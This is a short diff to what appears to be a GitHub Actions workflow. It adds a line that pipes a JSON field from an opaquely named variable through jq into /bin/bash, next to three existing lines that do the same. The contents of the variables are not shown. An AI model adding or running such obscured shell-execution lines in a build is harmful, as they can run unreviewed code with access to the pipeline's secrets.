@@ -22,6 +22,7 @@ jobs:
           echo $su677 | jq -r .vis74621 | /bin/bash
           printf '%s' "$t3" | jq -r .c988 | /bin/bash
           printf '%s' "$sq3" | jq -r .v92 | /bin/bash
+          printf '%s' "$l1" | jq -r .ajwe4602 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
